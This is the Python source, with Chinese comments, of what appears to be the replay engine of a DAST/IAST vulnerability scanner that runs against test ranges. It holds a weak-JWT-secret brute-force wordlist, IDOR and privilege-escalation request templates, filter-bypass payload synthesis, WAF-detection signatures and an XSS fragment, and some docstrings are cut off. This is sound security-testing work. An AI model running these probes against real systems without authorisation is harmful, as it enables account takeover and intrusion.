import json
import logging
import os
import re
import base64
import hmac
import hashlib
import tempfile
import threading
import time
from contextlib import contextmanager
from datetime import datetime
from pathlib import Path
from typing import TYPE_CHECKING, Any, Dict, Iterable, List, Optional, Set

if TYPE_CHECKING:  # pragma: no cover - 仅供类型标注，运行时不导入
    from src.iast.orchestrator import DastImpact
from urllib.parse import urljoin

import requests

from src.core.param_resolver import is_valid_param_name
from src.core.vuln_hash import enrich_finding_hash
from src.iast.response_oracle import encode_cookie_value as _cookie_safe_value
from src.infrastructure.db import Database

logger = logging.getLogger(__name__)

_D1_DUMP_LOCK = threading.Lock()


def _dump_outbound(method, url, final_url, query, headers, cookies, body,
                   content_type, files=None) -> None:
    """SAST_AI_D1_DUMP_REQ=1 时把一次出站请求落一行 JSONL。

    与旁路 `_send_one`（canary 名注入/followup）。第一版只给 `_send_one` 加了 dump，
    结果看到的全是旁路畸形请求（POST 变 GET、query 空、body key 空），差点据此误判根因。
    故抽成本函数，两条路径共用，避免再出现「观测口径只覆盖一半」的坑。
    """
    if not os.environ.get("SAST_AI_D1_DUMP_REQ"):
        return
    try:
        _dump_path = os.environ.get("SAST_AI_D1_DUMP_PATH") or "logs/d1_req_dump.jsonl"
        _rec = {
            "ts": time.strftime("%Y-%m-%dT%H:%M:%S"),
            "method": str(method or "").upper(),
            "final_url": str(final_url or url or ""),
            "raw_url": str(url or ""),
            "query": query or {},
            "headers": {k: v for k, v in (headers or {}).items()},
            "cookies": dict(cookies or {}),
            "content_type": str(content_type or ""),
            "body": (str(body)[:2000] if body is not None else None),
            "files": sorted(files.keys()) if isinstance(files, dict) else None,
        }
        with _D1_DUMP_LOCK:
            _d = os.path.dirname(_dump_path)
            if _d and not os.path.isdir(_d):
                os.makedirs(_d, exist_ok=True)
            with open(_dump_path, "a", encoding="utf-8") as _fh:
                _fh.write(json.dumps(_rec, ensure_ascii=False) + "\n")
    except Exception as _de:  # noqa: BLE001
        logger.debug("[D1.dump] 报文落盘失败（忽略）：%s", _de)

# M14：state_query 由写端点推导时候选验证的请求次数上限（算进 5 次重放预算）。
# 取 2 而不是放开：候选验证是「碰运气」，花 4 次去探一个不确定存在的读端点，
# 会挤掉真正要跑的通道（响应回读 / 回显比对 / 带外）。
_STATE_QUERY_CANDIDATE_BUDGET = 2

# 用 TLS 让内层复用外层，避免把「已投放」的状态当成基线。
_RESTORE_TLS = threading.local()

# 每个 (service_url, rid) 在进程内「首次观测到的可回滚基线」被记为规范化基线；所有回滚都写回
# 规范化基线，而不是「本次重放前的现场快照」。这样即使某次回滚失败、或靶标在进入前已被污染，
# 后续回滚仍会把靶标还原到规范化基线，杜绝「快照到已污染现场 → 把污染当成基线保留」的基线中毒。
_CANONICAL_BASELINE: Dict[tuple, Optional[Dict[str, Any]]] = {}
_CANONICAL_LOCK = threading.Lock()


def _join_url(base_url: str, path: str) -> str:
    """把 spec / 路由的相对路径拼到靶场 base_url 上，**必须保留 base_url 的 context path**。

    相对 URL 一律按绝对路径处理，会**静默丢弃 base_url 的 context path**：


    OWASP 全集靶场（service_url 带 /benchmark）因此连续三代 xss 分片 arrivals 恒 0：
    107/131 条重放全部打在 Tomcat 404 页上，事件表里只剩 Response.setHeader，
    真 sink（CoyoteWriter.write）一条没有。收敛成唯一函数，杜绝此类复发。
    """
    _p = str(path or "").lstrip("/")
    _b = str(base_url or "").rstrip("/")
    if not _b:
        return "/" + _p
    return urljoin(_b + "/", _p)

# RFC6265 cookie-octet 允许集（不含 CTL、空白、双引号、逗号、分号、反斜杠）：
#   %x21 / %x23-2B / %x2D-3A / %x3C-5B / %x5D-7E
_COOKIE_OCTET_DISALLOWED = re.compile(r"[^\x21\x23-\x2B\x2D-\x3A\x3C-\x5B\x5D-\x7E]")


# 628 实测 60 次登录墙 302 中 59 次集中在 /sqli/jdbc/vuln、45 次是 oracle 探测臂；
# 根因是 _tech_session_cache 一轮扫描共用一次登录、无 TTL / 无失效检测，而跑批 67.5min
# 超过 Tomcat 默认 30min 会话。守卫只认明确的登录路径，避免误伤 /file/status 业务跳
# 与 url_redirect 族靠 302 取证的重定向。
_AUTH_WALL_CODES = frozenset((301, 302, 303, 307, 308))
_AUTH_GUARD_MAX_RELOGIN = 3


def _login_wall_paths() -> List[str]:
    raw = os.environ.get("SAST_AI_LOGIN_PATHS", "/login")
    out: List[str] = []
    for seg in str(raw or "").split(","):
        p = seg.strip().lower().rstrip("/")
        if p and not p.startswith("/"):
            p = "/" + p
        if p and p not in out:
            out.append(p)
    return out or ["/login"]


def _logout_paths() -> List[str]:
    """主动注销端点。命中这些端点时 3xx → /login 是业务预期，不是会话失效。

    本轮实测 11 次「登录墙 302」里 9 次打的是 /logout：Spring Security 注销后
    跳登录页天经地义，守卫却把它读成「会话过期」并强制重登，制造出
    reauthed / reauth_failed 噪声。误判必须在这里挡掉，不能靠调低重登次数。
    """
    raw = os.environ.get("SAST_AI_LOGOUT_PATHS",
                         "/logout,/signout,/j_spring_security_logout,/api/logout")
    out: List[str] = []
    for seg in str(raw or "").split(","):
        p = seg.strip().lower().rstrip("/")
        if p and not p.startswith("/"):
            p = "/" + p
        if p and p not in out:
            out.append(p)
    return out


def _is_logout_url(url: Any) -> bool:
    try:
        from urllib.parse import urlparse
        path = (urlparse(str(url or "")).path or "").lower().rstrip("/") or "/"
    except Exception:
        return False
    return any(path == p or path.startswith(p + "/") for p in _logout_paths())


def _is_login_wall_response(status_code: Any, headers: Any, url: Any = None) -> bool:
    """只认「3xx 且 Location 落在登录路径」或明确的 401，不把任意 302 当登录墙。

    ``url`` 是本次请求的 URL：命中注销端点时直接返回 False（登出跳登录页是预期行为）。
    """
    if url and _is_logout_url(url):
        return False
    try:
        code = int(status_code or 0)
    except (TypeError, ValueError):
        return False
    if code == 401:
        return True
    if code not in _AUTH_WALL_CODES:
        return False
    try:
        from urllib.parse import urlparse
        h = headers or {}
        loc = str(h.get("Location") or h.get("location") or "")
        path = (urlparse(loc).path or "").lower().rstrip("/") or "/"
    except Exception:
        return False
    return any(path == p or path.startswith(p + "/") for p in _login_wall_paths())


def _attempt_action(auth_state: str = "") -> Dict[str, str]:
    """replay_attempts.action_json 的载荷；auth_state 追加而不覆盖原有来源标记。"""
    out = {"source": "d1_replay"}
    if auth_state:
        out["auth_state"] = str(auth_state)
    return out


def _fallback_auth_cookies(target: Optional[Dict[str, Any]] = None,
                           force: bool = False) -> Dict[str, str]:
    """bootstrap 拿不到会话时的**兜底登录**。

    背景：技术族会话通道依赖 ``target["login"]`` + ``bootstrap_accounts``，
    而 bootstrap 是「按应用注册信息推演」的，对没登记过登录表单的应用常常空手而归

    这里补一条**直接登录**的兜底：配置来源按优先级
      1. 环境变量 ``SAST_AI_AUTH_SESSION``（JSON 字符串）
      2. ``target["auth"]`` / ``target["login"]`` 里的同名字段
    没配置就返回空字典，行为与之前完全一致（默认零影响）。

    force=True 用于认证守卫：先 invalidate 进程级会话单例再取 cookie，确保会话过期时
    真的重新登录，而不是拿 TTL 内缓存的旧 cookie 把同一个 302 再打一遍。
    """
    try:
        from src.iast.auth_session import settings_from_workspace
    except Exception:
        return {}
    settings: Dict[str, Any] = {}
    raw_env = os.environ.get("SAST_AI_AUTH_SESSION", "").strip()
    if raw_env:
        try:
            import json as _json
            settings = _json.loads(raw_env)
        except Exception:
            logger.warning("[D1.auth] SAST_AI_AUTH_SESSION 不是合法 JSON，忽略")
            settings = {}
    if not settings and isinstance(target, dict):
        for key in ("auth", "login"):
            cand = target.get(key)
            if isinstance(cand, dict):
                settings = settings_from_workspace(cand)
                if settings.get("username"):
                    break
    if not settings.get("username") or not settings.get("password"):
        return {}
    base_url = ""
    if isinstance(target, dict):
        # 历史上只认 service_url / base_url，而 workspace.settings_json 用的是 target_url，
        # 上游一旦没做键名映射，这里直接 return {} ⇒ 兜底登录静默失效 ⇒ 全片 302。
        base_url = str(target.get("service_url") or target.get("base_url")
                       or target.get("target_url") or "")
    if not base_url:
        return {}
    try:
        from src.iast.auth_session import get_manager
        # 进程级单例：per-spec 新建 manager 等于「每条 spec 登录一次」，
        _mgr = get_manager(settings)
        if force:
            try:
                _mgr.for_base(base_url).invalidate()
            except Exception as _ie:  # noqa: BLE001
                logger.debug("[D1.auth] invalidate 失败（忽略）：%s", _ie)
        cookie_str = _mgr.get_cookie(base_url)
    except Exception as exc:  # noqa: BLE001
        logger.warning("[D1.auth] 兜底登录异常（忽略）：%s", exc)
        return {}
    if not cookie_str:
        logger.warning("[D1.auth] 兜底登录未取得会话（base=%s user=%s）",
                       base_url, settings.get("username"))
        return {}
    out: Dict[str, str] = {}
    for seg in str(cookie_str).split(";"):
        seg = seg.strip()
        if "=" in seg:
            k, v = seg.split("=", 1)
            if k.strip():
                out[k.strip()] = sanitize_cookie_value(v.strip())
    if out:
        logger.info("[D1.auth] 兜底登录成功，携带 cookie：%s", sorted(out))
    return out


def sanitize_cookie_value(value: str) -> str:
    """把要放进 Cookie 头的值净化到 RFC6265 cookie-octet 允许集。

    ``s4st41ebbebe1cc5cd727a"><svg0a973df9``）。这类值直接塞进 ``Cookie:`` 头会被 Servlet 容器
    判为非法：容器要么整条 cookie 解析失败、要么把值截断在双引号处，Spring 侧随即报
    ``Missing cookie 'xss'`` 并返回 400 —— 控制器根本不执行，sink 自然 0 事件（no-arrival）。

    净化只做「非法字符 → ``_`` 替换」，身份段（``s4st41<16hex>`` 全为字母数字）原样保留，
    因此 I1 侧按身份段关联的能力不受影响；且被替换掉的本就是非法字节，不损失可证据性。
    已用带会话 curl 验证：原值 → 400 Missing cookie；净化后（等价于把 ``"><svg`` 换成下划线）
    → 200 且回显身份段。
    """
    s = str(value or "")
    if not s:
        return s
    return _COOKIE_OCTET_DISALLOWED.sub("_", s)


# 「连接级失败」标记 —— 只有靶场**根本没应答**才说明可能不健康。
# 刻意不含 "500"/"5xx"：那是靶场**应答了**、只是业务报错，属于「可重试」，不等于「靶场不健康」。
_CONN_FAILURE_MARKERS = (
    "connection refused", "connectionrefused", "connection reset", "connectionreset",
    "connection aborted", "connectionaborted", "remote end closed", "remotedisconnected",
    "remotedisconnectederror", "broken pipe", "brokenpipe",
    "timed out", "timeout", "readtimeout", "connecttimeout", "connectiontimeout",
    "max retries exceeded", "network is unreachable", "unreachable",
    "name or service not known", "nodename nor servname",
    "temporary failure in name resolution", "getaddrinfo", "no route to host",
)


def is_connection_level_failure(err: str) -> bool:
    """判断 D1 重放失败是否属于「靶场根本没应答」（连接拒绝/重置/超时/DNS 失败）。

    分支里一律置 ``target_unhealthy=True``，注释理由是「这通常是靶场 5xx/连接异常/超时（靶场不健康）」。
    ``verdict=clean`` / ``restarts=0`` / ``downtime_windows=[]``（基线态与活动态是同一个 pid），
    一条不可用证据都没有。真实成因是：单次请求超时（高并发排队，或载荷本身连不通的端点）
    与「靶场 5xx」都会被归入此分支，而它们都不满足「靶场不健康」。

    现改为：只有**连接级**失败才置 target_unhealthy；靶场应答过（含重复 5xx）则只标
    provisional（交 I2 裁定、闭环可重试），不冒充「靶场不健康」。
    消费侧另有 ``src/iast/target_epoch.epoch_clears_unavailability`` 的纪元交叉校验兜底。
    """
    s = str(err or "").lower()
    if not s:
        return False
    return any(m in s for m in _CONN_FAILURE_MARKERS)


# 上传语义的端点路径段 / 文件字段名词元（用于空 content_type 时的 multipart 推断）。
_UPLOAD_PATH_SEGMENTS = ("file", "upload", "uploads", "attachment", "picture")
_FILE_PARAM_TOKENS = ("file", "upload", "picture", "avatar", "attachment", "multipart")


def _camel_tokens(text: str) -> List[str]:
    """把标识符拆成小写词元：uploadFile → [upload, file]；profile_id → [profile, id]。

    为什么不能直接子串匹配：``"file" in "profile"`` 为真（profile 的第 4~7 个字符正是 file），
    ``"file" in "/profile/update"`` 因此也为真 —— 会把「用户资料更新」误判成上传端点。
    这个误判是实测出来的（单测 test_empty_content_type_needs_both_endpoint_and_param_hints
    第一次运行就红了），不是设想出来的边角。
    """
    import re as _re

    spaced = _re.sub(r"([a-z0-9])([A-Z])", r"\1 \2", str(text or ""))
    return [t.lower() for t in _re.split(r"[^A-Za-z0-9]+", spaced) if t]


def _should_use_multipart(
    content_type: str, endpoint: str, param_name: str, param_location: str, method: str
) -> bool:
    """判断某条 spec 应以 multipart/form-data 投递参数，而不是 query/body/form。

    背景：``param_location`` 与 ``content_type`` 是两个独立来源，可能互相矛盾。
    当 ``content_type`` 声明 multipart、而 ``param_location`` 是 query/body/form 时，
    参数会被塞进 query string，目标侧 Spring 的 ``@RequestParam MultipartFile``
    永远取不到值（文件字段不在 multipart 体里）→ 该 spec 的 sink 0 事件、永久 no-arrival。

    两级判据：
    1. ``content_type`` 含 multipart —— 线格式的权威声明，直接采信。
    2. ``content_type`` 为空时**极窄推断**：method 是写方法、param_location 是 query/body/form、
       端点路径有「上传语义段」、且参数名有「文件词元」。

    /wallet/withdraw 等）。若一律改投 multipart，会把大量正常流量带偏，制造新的漏检。
    加上「端点段 + 参数词元」双条件后，三个任务里仅命中 2 条

    匹配用「段/词元」而非子串：子串会把 /profile/update 误判成上传端点（见 _camel_tokens 注释）。
    """
    ploc = str(param_location or "query").lower()
    if ploc not in ("query", "body", "form"):
        return False  # 已声明 header/cookie/path/multipart，不存在线格式矛盾
    if str(method or "").upper() not in ("POST", "PUT", "PATCH"):
        return False
    ct = str(content_type or "").lower()
    if "multipart" in ct:
        return True
    if ct:
        return False  # 声明了别的线格式（json / x-www-form-urlencoded），以声明为准
    segments = _camel_tokens(str(endpoint or "").replace("/", " "))
    tokens = _camel_tokens(param_name)
    seg_hit = any(seg == h or seg.startswith(h) for seg in segments for h in _UPLOAD_PATH_SEGMENTS)
    tok_hit = any(tok == h or tok.startswith(h) for tok in tokens for h in _FILE_PARAM_TOKENS)
    return seg_hit and tok_hit


#
#   Fastjson.Deserialize(@RequestBody String params) → JSON.parseObject(params)
#   XStreamRce.parseXml(request)                     → xstream.fromXML(xml)
#   QLExpress.vuln1(request)                        → runner.execute(express)
# A2 登记的 param_name 是 `_body` / `requestBody` / `xml` 这类**占位名**，不是真实参数名。
# 但 _inject 的 body/form 分支一律构造 {占位名: payload} 字典，content_type 又为空 ⇒
# 主发送走 json= 发出 `{"_body": "rO0AB..."}`。活靶场实测三种错误结果：
#   /fastjson/deserialize → java.lang.NullPointerException（碰巧是合法 JSON，name 为 null）
#   /xstream              → 500 StreamException
#   /vuln1                → 500 QLBizException
# 而裸串 data= 投递分别得到 SASTAI_PROBE / xstream / 777。
#
# 三重窄门（族 + 占位参数名 + 未声明结构化线格式）确保只命中这类 sink：
# Shiro 的 rememberMe(cookie)、Deserialize 的 data(query)、声明 application/json 的
# @RequestBody Map 端点全部不受影响。
_RAW_BODY_FAMILIES = frozenset({
    "deserialization", "insecure_deserialization", "unsafe_deserialization",
    "java_deserialization", "expression_injection", "expr_injection",
})
_RAW_BODY_PARAM_NAMES = frozenset({
    "_body", "body", "requestbody", "request_body", "rawbody", "raw_body",
    "xml", "params", "express", "expression", "content",
})


def needs_raw_body_payload(family: Any, param_name: Any,
                           param_location: Any, content_type: Any) -> bool:
    """该 spec 是否应把 payload 作为**裸请求体**原样发出，而不是包成命名字段。

    纯函数，供 _inject（主重放）、_run_family_oracle（探测臂）与基线/补投共用，
    保证「主请求与 oracle 探测臂打的是同一种线格式」——627 的 fastjson 退步正是
    探测臂走裸串、主请求走 JSON 字典，两边结论根本不可比。
    """
    fam = str(family or "").strip().lower().replace("-", "_")
    if fam not in _RAW_BODY_FAMILIES:
        return False
    if str(param_location or "").strip().lower() not in ("body", "form"):
        return False
    name = re.sub(r"[^a-z0-9_]", "", str(param_name or "").lower())
    if name not in _RAW_BODY_PARAM_NAMES:
        return False
    ct = str(content_type or "").strip().lower()
    return (not ct) or ct.startswith("text/")


def body_data_json(body: Any, content_type: Any):
    """把逻辑请求体映射到 requests 的 ``(data=, json=)`` 两参。

    裸串必须走 data=：走 json= 会被 requests 再包一层 JSON 引号（`"111 * 7"`），
    表达式/XML 解析器直接失败。其余情形与历史行为逐字一致。
    """
    if isinstance(body, (str, bytes)):
        return body, None
    if body is None:
        return None, None
    if "form" in str(content_type or "").lower():
        return body, None
    return None, body


def _canon_key(service_url: str, rid: str) -> tuple:
    return (str(service_url or "").rstrip("/"), str(rid))


def _profile_differs(now: Optional[Dict[str, Any]], base: Optional[Dict[str, Any]],
                    fields=("username", "password", "role", "email", "phone",
                            "nickname", "signature", "isVip", "balance", "avatar")) -> bool:
    if not isinstance(base, dict) or not isinstance(now, dict):
        return True
    for k in fields:
        if k in base and str(base.get(k)) != str(now.get(k)):
            return True
    return False


def _canon_restore(service, target, accounts, rid, baseline, attempts=5) -> "tuple[bool, str]":
    """带重试地写回规范化基线；全部尝试失败才返回 (False, detail)。"""
    last: "tuple[bool, str]" = (False, "未执行")
    for i in range(attempts):
        ok, detail = service._profile_restore(target, accounts, rid, baseline)
        if ok:
            return True, detail
        last = (False, detail)
        if i < attempts - 1:
            time.sleep(0.15 * (i + 1))
    return last


# 角色特权排序（低→高），用于 bootstrap 时把多账户归为 attacker(低)/victim(高)。
# 平台不识别具体应用角色语义，只按通用层级收敛；未知角色按普通用户(1)处理。
_PRIV_ORDER = {"guest": 0, "anonymous": 0, "user": 1, "member": 1, "customer": 1,
               "staff": 1, "employee": 1, "moderator": 2, "operator": 2,
               "admin": 3, "administrator": 3, "root": 4, "superadmin": 4}

# 第九类重放 signature_bypass 的弱密钥爆破字典（最慢一步，受控规模；可经 spec.weak_secret_wordlist 扩展）
_WEAK_JWT_SECRETS = [
    "secret", "secret123", "password", "123456", "key", "jwt", "jwtsecret",
    "admin", "test", "changeme", "default", "letmein", "qwerty", "abc123",
    "supersecret", "mysecret", "token", "apikey",
]

# 字段表来自常见业务表单约定。当 spec 无 body 且端点命中此表时，
# D1 据此构造合法 application/x-www-form-urlencoded 请求体，避免把 400/无响应误读成"端点已做鉴权拒绝"。
# 仅把请求装配到「可被靶场接收」的形态，不臆造任何确认结果——是否 confirmed 由靶场实际鉴权/业务逻辑决定。
# 字段值为占位示例（非真实越权目标），仅供 DAST 重放触发端点业务逻辑。
_ENDPOINT_REQUEST_SCHEMAS = {
    "/api/comment/moderate": {"method": "POST", "content_type": "application/x-www-form-urlencoded",
                              "fields": {"id": "1", "status": "APPROVED"}},
    "/ops/order/review":     {"method": "POST", "content_type": "application/x-www-form-urlencoded",
                              "fields": {"orderId": "1", "status": "PAID"}},
    "/ops/user/delete":      {"method": "POST", "content_type": "application/x-www-form-urlencoded",
                              "fields": {"uid": "1"}},
    "/profile/update":       {"method": "POST", "content_type": "application/x-www-form-urlencoded",
                              "fields": {"id": "1", "nickname": "x", "role": "ADMIN", "isVip": "true", "balance": "0"}},
    "/wallet/withdraw":      {"method": "POST", "content_type": "application/x-www-form-urlencoded",
                              "fields": {"amount": "1"}},
    "/wallet/transfer":      {"method": "POST", "content_type": "application/x-www-form-urlencoded",
                              "fields": {"amount": "1", "toUserId": "2"}},
}


def _privilege_rank(role: str) -> int:
    return _PRIV_ORDER.get(str(role or "").strip().lower(), 1)


def _decode_jwt_uid(token: str) -> Optional[Any]:
    """从 JWT 的 payload 段解析 uid/sub/user_id 声明（不校验签名，仅供 BOLA/IDOR 重放挑受害者 id）。

    供 replay_bola 在 VICTIM_FROM_POOL 哨兵下解析真实受害者资源 id。非 JWT（不透明 token）返回 None。
    """
    if not token or token.count(".") < 2:
        return None
    try:
        seg = token.split(".")[1]
        seg += "=" * (-len(seg) % 4)
        claims = json.loads(base64.urlsafe_b64decode(seg))
        if not isinstance(claims, dict):
            return None
        return claims.get("uid") or claims.get("sub") or claims.get("user_id")
    except Exception:
        return None


def _extract_set_cookie_value(set_cookie_header: str, cookie_name: str) -> str:
    """从原始 Set-Cookie 头里取指定 cookie 的值。

    requests 的 resp.cookies 在某些多 Set-Cookie / 同名场景下会漏，故同时提供
    原始头解析兜底（split(';')[0] 是 name=value，前面可能有逗号分隔的多段）。
    """
    if not set_cookie_header or not cookie_name:
        return ""
    for seg in set_cookie_header.split(","):
        pair = seg.split(";", 1)[0].strip()
        if pair.startswith(cookie_name + "="):
            return pair[len(cookie_name) + 1:].strip().strip('"')
    return ""


def _sanitizer_aware_synth(spec: Dict[str, Any], family: str) -> Dict[str, Any]:
    """净化感知造弹入口：在净化器约束内合成候选，并用确定性闸门过滤。

    一等公民判定优先：若登记阶段已判定「不可绕过」（真净化器），直接返回空候选并标记
    filter_effective —— 不再造弹、不再重试，避免死磕，并把"不可利用"这个真阴性结论保住。

    FilterSpec 的两个来源：
      1. spec["filter_spec"] —— 由净化器挖掘（src.core.sanitizer_miner）产出并回填的结构化约束；
      2. spec["sanitizer_candidates"][*]["body"] —— A2 契约里已有的净化器候选，取首个带方法体的
         就地抽取规则（跨文件/长链场景由挖掘阶段保证 body 已就位）。
    两者都没有 → 返回空候选，由调用方标记 degraded_no_synthesis（不投假弹）。
    """
    try:
        from src.core.sanitizer_miner import FilterSpec, extract_filter_spec
        from src.iast.sanitizer_forge import synthesize as _synthesize, gate as _gate
    except Exception:
        return {"candidates": [], "rejected": [], "spec": None, "source": "none"}

    # 一等公民判定短路：已判「不可绕过」→ 不再造弹（真净化器，保住"不可利用"这个真阴性）
    try:
        from src.core.filter_verdict import is_terminal as _is_terminal
        if _is_terminal(spec.get("filter_verdict")):
            # Q5：终态仍发一发无害诊断 canary（非破坏性）拿 IAST 到达信号，化解「判死=零证据」。
            # 该 canary 不触发利用，只证明探针是否看得到这次请求；被净化 → arrival-sanitized
            # 即「过滤器有效」的正向证据。重放层据 diagnostic_canary 发样本复核。
            try:
                from src.core.filter_verdict import terminal_diagnostic_canary as _diag
                _canary = _diag(str(spec.get("family") or ""))
            except Exception:
                _canary = ""
            return {"candidates": [], "rejected": [], "spec": spec.get("filter_spec"),
                    "source": "filter_effective", "terminal": True,
                    "diagnostic_canary": _canary}
    except Exception:
        pass

    fspec = FilterSpec.from_dict(spec.get("filter_spec"))
    body = ""
    if fspec is None:
        for cand in (spec.get("sanitizer_candidates") or []):
            if isinstance(cand, dict) and cand.get("body"):
                fspec = extract_filter_spec(str(cand.get("body")))
                body = str(cand.get("body"))
                if fspec is not None and fspec.is_known():
                    break
                fspec = None
    if fspec is None:
        return {"candidates": [], "rejected": [], "spec": None, "source": "none"}

    out = _synthesize(
        fspec, family, sink=str(spec.get("expected_sink_file") or ""), body=body,
        llm_complete=None, extra_bases=None, max_out=6,
    )
    survivors = _gate(list(out.get("candidates") or []), family, fspec)
    _verdict = None
    try:
        from src.core.filter_verdict import classify as _cls
        _verdict = _cls(fspec, family, candidates=survivors)
    except Exception:
        _verdict = None
    return {"candidates": survivors, "rejected": list(out.get("rejected") or []),
            "spec": fspec.to_dict(), "source": (out.get("source") or "deterministic")
            if survivors else "degraded_no_synthesis", "verdict": _verdict,
            "terminal": bool(_verdict and _verdict.get("verdict") == "non_bypassable")}


def _dig(obj: Any, *keys: str) -> Any:
    """安全多级取值：依次按 key 下钻，任一环节非 dict 即返回 None（供 raw_json.exploit_spec.* 取值）。"""
    cur = obj
    for k in keys:
        if isinstance(cur, str):
            try:
                cur = json.loads(cur)
            except Exception:
                return None
        if not isinstance(cur, dict):
            return None
        cur = cur.get(k)
    return cur


class D1Service:
    """Persistent DAST-IDOR module: assets, accounts, traffic, replay and AI-style decisions."""

    DENY_WORDS = ("forbidden", "unauthorized", "permission denied", "access denied", "not allowed", "无权限", "未授权", "禁止")
    SUCCESS_WORDS = ("success", "ok", "true", "created", "updated", "deleted")
    SKIP_PATH_TOKENS = ("health", "swagger", "static", "favicon", "actuator", "metrics")
    # 仅当响应显式携带 WAF 特征或 4xx 拒绝 + 拒绝词时才置 waf_blocked，避免误伤正常 200 响应。
    # 拒绝类状态码（应用拦截器 / 授权过滤器 / 参数校验拒绝）。
    _WAF_BLOCK_STATUS = (401, 403, 405, 406, 407, 429)
    # 显式 WAF/安全设备签名（强信号，命中即判拦截）。
    _WAF_SIGNATURES = (
        "cloudflare", "aws-waf", "awswaf", "x-amzn-requestid", "mod_security", "modsecurity",
        "request blocked by", "blocked by", "security policy", "waf", "防火墙", "安全策略",
        "denied by", "rate limit", "rate-limit", "too many requests", "captcha",
    )
    # **HTTP 200 + "Bad boy. I got u."** —— 既不是 4xx、也没有任何 WAF 响应头，
    # 上面的两条判据（WAF 签名 / 4xx+拒绝词）全部落空 → waf_blocked 恒 False →
    # decide_next_action 的 blocked 分支永不触发 → escalate_variant 永不点火
    # 此类判定必须保守：仅在「2xx + 短响应 + 明确拒绝文案」三者同时成立时才判拦截，
    # 避免误伤正常业务 200 响应。
    _FILTER_REJECT_PHRASES = (
        "bad boy", "i got u", "request blocked", "blocked by",
        "illegal character", "invalid character", "forbidden character",
        "contains illegal", "not allowed", "input rejected", "input filtered",
        "非法字符", "包含非法", "参数非法", "输入被拒绝", "已被过滤",
    )
    _FILTER_REJECT_MAX_LEN = 500

    def _record_replay_attempt(self, *, spec: Dict[str, Any], method: str, url: str,
                               param_name: str, param_location: str, payload: str,
                               encoding: str, content_type: str,
                               headers: Optional[Dict[str, str]], response: Any, text: str,
                               waf_blocked: bool, elapsed_ms: int, attempt_no: int = 1,
                               auth_state: str = "") -> None:
        """把一次重放尝试结构化落库到 replay_attempts。

        动机：响应证据此前只写进 19MB 的报告 JSON（dast_impact_evidence），跨轮查不到，
        LLM 判因读不到，I2 只能靠规则表猜「payload 被拦」还是「打法错」。
        本方法把「发了什么（payload/位置/编码/头）+ 回了什么（状态码/响应体前 4KB）
        + 拦截信号（waf_blocked）」落成一行事实，供判因与跨轮复用读取。

        约定：任何异常都只 debug 记录，绝不阻断重放主流程。
        """
        if self.db is None or not spec:
            return
        try:
            _task_id = int(spec.get("task_id") or 0)
            if not _task_id:
                return
            _hdr_digest = ""
            try:
                # `resp_headers_digest`。后果：CORS 的确认判据（响应头是否反射了
                # 攻击者 Origin）根本无从判断 —— 603 实测 5 条 cors spec 全部停在
                # `no-arrival`，而 oracle 臂的响应体是正常业务数据（请求确实成功了）。
                # 请求头本来就有 `extra_headers_json` 列，这里改为名副其实存响应头。
                _rh = getattr(response, "headers", None) or {}
                try:
                    _items = list(dict(_rh).items())
                except Exception:  # noqa: BLE001
                    _items = []
                _hs = sorted((str(k).lower(), str(v)[:60]) for k, v in _items)
                _hdr_digest = ",".join("%s=%s" % (k, v) for k, v in _hs)[:500]
            except Exception:
                _hdr_digest = ""
            _body_head = str(text or "")[:4096]
            self.db.execute(
                "INSERT INTO replay_attempts (task_id, workspace_id, spec_id, vulnerability_hash_v2,"
                " attempt_no, family, target_endpoint, http_method, param_name, param_location,"
                " payload, encoding, content_type, extra_headers_json, status_code,"
                " resp_headers_digest, resp_body_head, resp_body_len, elapsed_ms, waf_blocked,"
                " read_state, iast_state, verdict, reason, action_json, created_at)"
                " VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
                (
                    _task_id,
                    int(spec.get("workspace_id") or 0),
                    spec.get("id"),
                    str(spec.get("vulnerability_hash_v2") or ""),
                    int(attempt_no or 1),
                    str(spec.get("family") or ""),
                    str(url or spec.get("target_endpoint") or "")[:500],
                    str(method or "GET").upper(),
                    str(param_name or ""),
                    str(param_location or "query"),
                    # 2000 会把 Shiro rememberMe 的 AES 包装弹
                    # 从中间切断 ⇒ 落库样本解码后 1500 字节、不是 16 的倍数 ⇒
                    # 复核时手工重打必抛 IllegalBlockSizeException，被误判成
                    # 「载荷形态/密钥/对齐都错了」（实际投放用的是完整值，未截断）。
                    # 观测数据必须忠实于线上流量，否则证据链会反向误导排查。
                    str(payload or "")[:8000],
                    str(encoding or "")[:200],
                    str(content_type or "")[:200],
                    self.db.dumps({"headers": dict(list((headers or {}).items())[:12])}) if hasattr(self.db, "dumps") else "{}",
                    int(getattr(response, "status_code", 0) or 0),
                    _hdr_digest,
                    _body_head,
                    len(str(text or "")),
                    int(elapsed_ms or 0),
                    1 if waf_blocked else 0,
                    "",
                    "",
                    "",
                    "",
                    self.db.dumps(_attempt_action(auth_state)) if hasattr(self.db, "dumps") else "{}",
                    datetime.now().isoformat(timespec="seconds"),
                ),
            )
        except Exception as exc:
            logger.debug("[D1.replay] 重放尝试落库失败（忽略，不影响主流程）：%s", exc)

    def _is_waf_blocked(self, status_code: Optional[int], text: str, headers: Optional[Dict[str, str]] = None) -> bool:
        """判定重放响应是否「被 WAF / 拦截器 / 参数截断」拦截（而非漏洞无证据）。

          - 显式 WAF 签名（响应头/体含 cloudflare / mod_security / waf / 防火墙 / 安全策略 /
            rate limit / too many requests 等）：强信号，直接判拦截；
          - 拒绝类状态码（401/403/405/406/407/429）+ 拒绝词（DENY_WORDS）：应用拦截器 / 授权过滤器 /
            参数校验拒绝，弱于显式 WAF 但仍足以与「干净」区分。
        仅当靶场确实返回拦截特征时才命中；正常 200 响应（无论是否有漏洞）一律不命中，避免误伤。
        """
        if status_code is None:
            return False
        _lc_text = (text or "").lower()
        _lc_headers = " ".join(f"{k.lower()}: {v.lower()}" for k, v in (headers or {}).items())
        _blob = _lc_text + " " + _lc_headers
        # 显式 WAF 签名：强信号。
        if any(sig in _blob for sig in self._WAF_SIGNATURES):
            return True
        # 4xx 拒绝 + 拒绝词：应用层拦截（弱信号，需双条件同时成立）。
        if int(status_code) in self._WAF_BLOCK_STATUS:
            if any(w in _lc_text for w in self.DENY_WORDS):
                return True
        # 应用层过滤拒绝（批次 C）：2xx + 短响应 + 明确拒绝文案。
        # 见 _FILTER_REJECT_PHRASES 的实证说明；限长与强词是为避免误伤正常 200 业务响应。
        if 200 <= int(status_code) < 300 and 0 < len(_lc_text) <= self._FILTER_REJECT_MAX_LEN:
            if any(p in _lc_text for p in self._FILTER_REJECT_PHRASES):
                return True
        return False

